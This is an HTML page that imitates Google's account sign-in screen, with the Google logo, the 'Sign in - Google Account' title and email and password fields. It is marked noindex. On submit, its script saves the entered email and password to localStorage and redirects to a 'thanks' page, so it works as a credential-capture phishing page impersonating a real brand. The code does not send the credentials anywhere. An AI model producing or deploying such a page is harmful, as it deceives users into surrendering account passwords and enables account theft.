<!doctype html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Sign in - Google Account</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link
            href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
            rel="stylesheet"
        />
        <meta name="robots" content="noindex, nofollow">

        <style>
            body {
                font-family: "Roboto", sans-serif;
                background-color: #f8f9fa;
            }
            .google-card {
                max-width: 448px;
                width: 100%;
                background: white;
                border: 1px solid #dadce0;
                border-radius: 8px;
                padding: 48px 40px 36px;
            }
            .input-group {
                position: relative;
                margin-bottom: 24px;
            }
            .input-group input {
                width: 100%;
                padding: 13px 15px;
                border: 1px solid #dadce0;
                border-radius: 4px;
                font-size: 16px;
                outline: none;
            }
            .input-group input:focus {
                border-color: #1a73e8;
                border-width: 2px;
                padding: 12px 14px;
            }
            .input-group label {
                position: absolute;
                left: 15px;
                top: 13px;
                color: #5f6368;
                pointer-events: none;
                transition: all 0.2s;
                background: white;
                padding: 0 4px;
            }
            .input-group input:focus + label,
            .input-group input:not(:placeholder-shown) + label {
                top: -10px;
                left: 10px;
                font-size: 12px;
                color: #1a73e8;
            }
            .btn-next {
                background-color: #1a73e8;
                color: white;
                padding: 10px 24px;
                border-radius: 4px;
                font-weight: 500;
                cursor: pointer;
            }
        </style>
    </head>
    <body class="min-h-screen flex flex-col items-center justify-center p-4">
        <div class="google-card shadow-sm">
            <div class="flex flex-col items-center mb-8">
                <svg viewBox="0 0 24 24" width="48" height="48" class="mb-4">
                    <path
                        fill="#4285F4"
                        d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                    />
                    <path
                        fill="#34A853"
                        d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                    />
                    <path
                        fill="#FBBC05"
                        d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z"
                    />
                    <path
                        fill="#EA4335"
                        d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                    />
                </svg>
                <h1 class="text-2xl font-normal text-gray-900">Sign in</h1>
                <p class="text-base text-gray-700 mt-2">
                    Use your Google Account
                </p>
            </div>

            <form id="loginForm" onsubmit="return saveChoices();">
                <div class="input-group">
                    <input type="text" id="email" placeholder=" " required />
                    <label for="email">Email or phone</label>
                </div>
                <div class="input-group">
                    <input
                        type="password"
                        id="password"
                        placeholder=" "
                        required
                    />
                    <label for="password">Enter your password</label>
                </div>
                <div class="flex items-center justify-between mt-10">
                    <a
                        href="#"
                        class="text-blue-600 font-medium hover:underline text-sm"
                        >Forgot email?</a
                    >
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        </div>
    <script>
        function saveChoices() {
            localStorage.setItem("email", document.getElementById("email").value);
            localStorage.setItem("password", document.getElementById("password").value);

            // Go to Page 3
            window.location.href = "thanks.html";

            return false; // stop page refresh
        }
    </script>

</body>
</html>
